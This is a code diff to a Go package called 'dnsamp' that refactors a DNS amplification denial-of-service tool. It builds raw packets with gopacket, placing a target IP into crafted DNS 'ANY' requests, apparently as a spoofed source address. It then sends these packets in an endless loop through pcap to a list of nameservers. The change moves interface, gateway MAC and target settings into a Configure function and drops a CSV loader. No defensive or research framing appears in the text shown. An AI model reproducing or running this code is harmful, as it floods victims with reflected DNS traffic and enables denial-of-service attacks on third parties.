@@ -1,10 +1,8 @@
 package dnsamp
 
 import (
-	"encoding/csv"
 	"math/rand"
 	"net"
-	"os"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -18,26 +16,15 @@ type Target struct {
 }
 
 const SRC_PORT = 42000
-const IFACE = "wlp166s0"
 
-var options gopacket.SerializeOptions
-var srcMac net.HardwareAddr
-var dstMac net.HardwareAddr
-
-func init() {
-    var err error
-    srcMac = getHardwareAdress()
-    // TODO: find a way to get the gateway MAC address
-    dstMac, err = net.ParseMAC("ac:15:a2:be:6e:88")
-    // dstMac = layers.EthernetBroadcast
-    if err != nil {
-        panic(err)
-    }
-    options = gopacket.SerializeOptions{
+var options = gopacket.SerializeOptions{
         ComputeChecksums: true,
         FixLengths:       true,
-    }
 }
+var netIface string
+var srcMac net.HardwareAddr
+var dstMac net.HardwareAddr
+var targetIP net.IP
 
 func getHardwareAdress() net.HardwareAddr {
     var src_mac net.HardwareAddr
@@ -46,15 +33,22 @@ func getHardwareAdress() net.HardwareAddr {
         panic(err)
     }
     for _, iface := range ifaces {
-        if iface.Name == IFACE {
+        if iface.Name == netIface {
             src_mac = iface.HardwareAddr
         }
     }
     return src_mac
 }
 
+func Configure(iface string, destinationMac net.HardwareAddr, target net.IP) {
+    netIface = iface
+    dstMac = destinationMac
+    srcMac = getHardwareAdress()
+    targetIP = target
+}
+
 // create ANY request packet
-func makePacket(targetIP net.IP, domainName string, nameserverIP net.IP) []byte {
+func makePacket(domainName string, nameserverIP net.IP) []byte {
     ethernet := layers.Ethernet{
         SrcMAC: srcMac,
         DstMAC: dstMac,
@@ -96,36 +90,8 @@ func makePacket(targetIP net.IP, domainName string, nameserverIP net.IP) []byte 
     return buffer.Bytes()
 }
 
-// Read the file into a datastructure
-func ReadFile(filename string) []Target {
-    file, err := os.Open(filename)
-    if err != nil {
-        panic(err)
-    }
-    defer file.Close()
-    reader := csv.NewReader(file)
-    // skip first line
-    if _, err := reader.Read(); err != nil {
-        panic(err)
-    }
-    records, err := reader.ReadAll()
-    if err != nil {
-        panic(err)
-    }
-    res := []Target{}
-    // domain, nameserver, ip, request response, tc
-    for _, record := range records {
-        target := Target{
-            DomainName: record[0],
-            NameServer: record[2],
-        }
-        res = append(res, target)
-    }
-    return res
-}
-
-func Send(targetIP net.IP, servers []Target) {
-    handle, err := pcap.OpenLive(IFACE, 1500, false, pcap.BlockForever)
+func Send(servers []Target) {
+    handle, err := pcap.OpenLive(netIface, 1500, false, pcap.BlockForever)
     if err != nil {
         panic(err)
     }
@@ -133,8 +99,9 @@ func Send(targetIP net.IP, servers []Target) {
     for {
         for _, server := range servers {
             nameserverIP := net.ParseIP(server.NameServer)
+            // Ignore invalid lines in the file
             if nameserverIP != nil {
-                packet := makePacket(targetIP, server.DomainName, nameserverIP)
+                packet := makePacket(server.DomainName, nameserverIP)
                 err = handle.WritePacketData(packet)
                 if err != nil {
                     panic(err)
